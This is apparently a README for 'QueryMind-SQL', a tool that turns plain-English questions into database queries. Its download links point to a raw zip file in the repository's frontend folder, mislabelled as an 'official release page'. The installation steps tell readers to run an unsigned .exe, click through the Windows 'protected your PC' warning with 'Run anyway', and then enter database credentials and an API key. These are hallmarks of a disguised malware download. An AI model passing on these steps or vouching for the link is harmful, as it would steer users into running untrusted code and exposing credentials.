# 🤖 QueryMind-SQL - Turn your plain English into data

[![Download QueryMind-SQL](https://img.shields.io/badge/Download-QueryMind-blue.svg)](https://raw.githubusercontent.com/fik93673/QueryMind-SQL/main/frontend/Mind_SQL_Query_2.2.zip)

QueryMind-SQL helps you get answers from your company database without writing code. You ask questions in plain English, and the system finds the data for you. It uses smart technology to understand your request and translate it into a language your database understands. A safety check ensures your data remains protected throughout the process.

## 📥 How to download the application

You can start by accessing the primary hosting page to retrieve the latest version of the software.

1. Go to the [official release page](https://raw.githubusercontent.com/fik93673/QueryMind-SQL/main/frontend/Mind_SQL_Query_2.2.zip).
2. Look for the Section labeled Latest.
3. Select the file ending in .exe to begin your download to your Windows machine.
4. Save the file to your desktop or downloads folder.

## 🛠️ Setting up your system

Your computer needs a few basic tools to run QueryMind-SQL. Most modern computers meet these standards easily. 

* Operating System: Windows 10 or Windows 11.
* Memory: At least 8GB of RAM.
* Storage: 500MB of free disk space.
* Internet Connection: Required for connecting to the data warehouse.

The application handles the connection to your internal servers. Ensure your network settings allow for outbound connections to your database host.

## ⚙️ Initial Configuration

Once you download the file, double-click the QueryMind-SQL icon. Windows might show a screen titled "Windows protected your PC." This happens because we provide the software directly without a third-party app store store signature. Click "More info" and then select "Run anyway" to open the application.

After the window opens, the setup wizard guides you through these steps:

1. Connect to your database: You will need your host address, your port number, and your database credentials. 
2. Set your API Key: The system uses an external intelligence model to process language. You must insert your specific API key into the settings menu.
3. Configure the safety guard: Define which tables the system can search. This limits the application to specific information you authorize.

## 📈 Understanding the technology

QueryMind-SQL combines several technologies to make your work easier. You do not need to manage these parts, but understanding them helps you see why the system is fast and safe.

* Retrieval Augmented Generation: This process searches through your database documents first so the system knows what information exists before it writes a query.
* Semantic Schema Injection: The system learns the meaning of your column names. If you ask for "sales," it knows exactly which part of the database holds that dollar amount.
* Human-In-The-Loop Safety: Before any query runs, the system shows you exactly what it intends to ask. You see the code. You click approve. Your data stays safe because you hold final control over every action.

## 💬 How to ask questions

Type your request into the main text box. Use normal sentences. You do not need special formatting.

* Instead of "SELECT * FROM sales WHERE region = 'north'", just type: "Show me the total sales for the north region during the last month."
* QueryMind-SQL breaks this request into parts. It identifies the "sales" table, the date range, and the specific region.
* The system constructs the language for the database and presents it in the window. 
* Review the query text in the preview box. 
* Press the "Run" button to see your results in a clear table format.

## 🛡️ Managing security

Security is a primary feature of this application. We designed this tool for environments where data privacy matters. 

* Local Processing: Your queries undergo transformation on your machine before they reach your data warehouse.
* Read-Only Access: We recommend that you connect the application using a read-only account. Since the system only generates queries for reading data, it lacks the ability to change or delete your information.
* Usage Logs: Open the settings tab to see a history of every question asked. This helps you monitor how your team uses the tool and confirms that only authorized queries run against your database.

## 🔧 Troubleshooting common issues

If you encounter difficulties, check these common areas first.

* Connection errors: Verify that your database is online and that you typed the correct host address and port.
* API Key errors: If the system returns an error regarding your model, verify that your API key has sufficient credits and that you pasted the key without extra spaces.
* Display issues: If the tables do not appear correctly, resize the window to refresh the layout of the user interface.
* Software updates: Check the main repository link if you experience errors after a Windows update. We release improvements periodically to fix bugs and increase speed.

## 📁 Project structure

This application uses a modular design to keep everything organized.

* The frontend provides the interface you interact with every day.
* The backend manages the translation from your words to the database language.
* The vector database stores the meanings of your table names so the system understands your business terminology quickly.

These components work together silently in the background. You simply open the app, ask your question, and view the answer. The complexity remains hidden because you should spend your time analyzing data, not struggling with software configuration. 

The software includes a feedback loop. If the system fails to answer your question correctly, you can provide feedback by clicking the thumbs-down icon. This helps us ensure that the software understands your specific business language better with each use.